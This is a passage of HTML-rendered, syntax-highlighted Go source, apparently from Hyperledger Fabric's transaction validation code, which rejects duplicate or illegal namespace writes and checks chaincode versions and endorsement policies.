	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;txRWSet&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NsRwSets&lt;/span&gt; {
		&lt;span style=&#34;color:#75715e&#34;&gt;// check to make sure there is no duplicate namespace in txRWSet
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;namespaces&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NameSpace&lt;/span&gt;]; &lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;duplicate namespace &amp;#39;%s&amp;#39; in txRWSet&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NameSpace&lt;/span&gt;),
				&lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_ILLEGAL_WRITESET&lt;/span&gt;
		}
		&lt;span style=&#34;color:#a6e22e&#34;&gt;namespaces&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NameSpace&lt;/span&gt;] = &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt;{}{}

		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;txWritesToNamespace&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;) {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
		}

		&lt;span style=&#34;color:#75715e&#34;&gt;// Check to make sure we did not already populate this chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// name to avoid checking the same namespace twice
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NameSpace&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;alwaysEnforceOriginalNamespace&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;wrNamespace&lt;/span&gt; = append(&lt;span style=&#34;color:#a6e22e&#34;&gt;wrNamespace&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NameSpace&lt;/span&gt;)
		}

		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;writesToLSCC&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NameSpace&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lscc&amp;#34;&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;writesToLSCC&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
		}

		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;writesToNonInvokableSCC&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;IsSysCCAndNotInvokableCC2CC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NameSpace&lt;/span&gt;) {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;writesToNonInvokableSCC&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
		}

		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;writesToNonInvokableSCC&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;IsSysCCAndNotInvokableExternal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NameSpace&lt;/span&gt;) {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;writesToNonInvokableSCC&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
		}
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// we&amp;#39;ve gathered all the info required to proceed to validation;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// validation will behave differently depending on the type of
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// chaincode (system vs. application)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;IsSysCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;) {
		&lt;span style=&#34;color:#75715e&#34;&gt;// if we&amp;#39;re here, we know this is an invocation of an application chaincode;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// first of all, we make sure that:
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// 1) we don&amp;#39;t write to LSCC - an application chaincode is free to invoke LSCC
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;//    for instance to get information about itself or another chaincode; however
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;//    these legitimate invocations only ready from LSCC&amp;#39;s namespace; currently
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;//    only two functions of LSCC write to its namespace: deploy and upgrade and
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;//    neither should be used by an application chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;writesToLSCC&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode %s attempted to write to the namespace of LSCC&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;),
				&lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_ILLEGAL_WRITESET&lt;/span&gt;
		}
		&lt;span style=&#34;color:#75715e&#34;&gt;// 2) we don&amp;#39;t write to the namespace of a chaincode that we cannot invoke - if
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;//    the chaincode cannot be invoked in the first place, there&amp;#39;s no legitimate
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;//    way in which a transaction has a write set that writes to it; additionally
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;//    we don&amp;#39;t have any means of verifying whether the transaction had the rights
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;//    to perform that write operation because in v1, system chaincodes do not have
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;//    any endorsement policies to speak of. So if the chaincode can&amp;#39;t be invoked
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;//    it can&amp;#39;t be written to by an invocation of an application chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;writesToNonInvokableSCC&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode %s attempted to write to the namespace of a system chaincode that cannot be invoked&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;),
				&lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_ILLEGAL_WRITESET&lt;/span&gt;
		}

		&lt;span style=&#34;color:#75715e&#34;&gt;// validate *EACH* read write set according to its chaincode&amp;#39;s endorsement policy
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wrNamespace&lt;/span&gt; {
			&lt;span style=&#34;color:#75715e&#34;&gt;// Get latest chaincode version, vscc and validate policy
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;txcc&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;vscc&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;policy&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetInfoForValidate&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;)
			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
				&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GetInfoForValidate for txId = %s returned error: %+v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxId&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
				&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_INVALID_OTHER_REASON&lt;/span&gt;
			}

			&lt;span style=&#34;color:#75715e&#34;&gt;// if the namespace corresponds to the cc that was originally
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;// invoked, we check that the version of the cc that was
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;// invoked corresponds to the version that lscc has returned
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;txcc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeVersion&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ccVer&lt;/span&gt; {
				&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode %s:%s/%s didn&amp;#39;t match %s:%s/%s in lscc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccVer&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txcc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txcc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeVersion&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;)
				&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%+v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
				&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_EXPIRED_CHAINCODE&lt;/span&gt;
			}

			&lt;span style=&#34;color:#75715e&#34;&gt;// do VSCC validation
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Context&lt;/span&gt;{
				&lt;span style=&#34;color:#a6e22e&#34;&gt;Seq&lt;/span&gt;:       &lt;span style=&#34;color:#a6e22e&#34;&gt;seq&lt;/span&gt;,
				&lt;span style=&#34;color:#a6e22e&#34;&gt;Envelope&lt;/span&gt;:  &lt;span style=&#34;color:#a6e22e&#34;&gt;envBytes&lt;/span&gt;,
				&lt;span style=&#34;color:#a6e22e&#34;&gt;Block&lt;/span&gt;:     &lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;,
				&lt;span style=&#34;color:#a6e22e&#34;&gt;TxID&lt;/span&gt;:      &lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxId&lt;/span&gt;,
				&lt;span style=&#34;color:#a6e22e&#34;&gt;Channel&lt;/span&gt;:   &lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;,
				&lt;span style=&#34;color:#a6e22e&#34;&gt;Namespace&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;,
				&lt;span style=&#34;color:#a6e22e&#34;&gt;Policy&lt;/span&gt;:    &lt;span style=&#34;color:#a6e22e&#34;&gt;policy&lt;/span&gt;,
				&lt;span style=&#34;color:#a6e22e&#34;&gt;VSCCName&lt;/span&gt;:  &lt;span style=&#34;color:#a6e22e&#34;&gt;vscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;,
			}
			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;VSCCValidateTxForCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
				&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;.(&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt;) {
				&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;commonerrors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;VSCCEndorsementPolicyError&lt;/span&gt;:
					&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_ENDORSEMENT_POLICY_FAILURE&lt;/span&gt;
				&lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;:
					&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_INVALID_OTHER_REASON&lt;/span&gt;
				}
			}
		}
	} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
		&lt;span style=&#34;color:#75715e&#34;&gt;// make sure that we can invoke this system chaincode - if the chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// cannot be invoked through a proposal to this peer, we have to drop the
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// transaction; if we didn&amp;#39;t, we wouldn&amp;#39;t know how to decide whether it&amp;#39;s
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// valid or not because in v1, system chaincodes have no endorsement policy
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;IsSysCCAndNotInvokableExternal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;) {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;committing an invocation of cc %s is illegal&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;),
				&lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_ILLEGAL_WRITESET&lt;/span&gt;
		}

		&lt;span style=&#34;color:#75715e&#34;&gt;// Get latest chaincode version, vscc and validate policy
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;vscc&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;policy&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetInfoForValidate&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GetInfoForValidate for txId = %s returned error: %+v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxId&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_INVALID_OTHER_REASON&lt;/span&gt;
		}

		&lt;span style=&#34;color:#75715e&#34;&gt;// validate the transaction as an invocation of this system chaincode;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// vscc will have to do custom validation for this system chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// currently, VSCC does custom validation for LSCC only; if an hlf
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// user creates a new system chaincode which is invokable from the outside
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// they have to modify VSCC to provide appropriate validation
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Context&lt;/span&gt;{
			&lt;span style=&#34;color:#a6e22e&#34;&gt;Seq&lt;/span&gt;:       &lt;span style=&#34;color:#a6e22e&#34;&gt;seq&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;Envelope&lt;/span&gt;:  &lt;span style=&#34;color:#a6e22e&#34;&gt;envBytes&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;Block&lt;/span&gt;:     &lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;TxID&lt;/span&gt;:      &lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxId&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;Channel&lt;/span&gt;:   &lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;Namespace&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;Policy&lt;/span&gt;:    &lt;span style=&#34;color:#a6e22e&#34;&gt;policy&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;VSCCName&lt;/span&gt;:  &lt;span style=&#34;color:#a6e22e&#34;&gt;vscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;,
		}
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;VSCCValidateTxForCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;.(&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt;) {
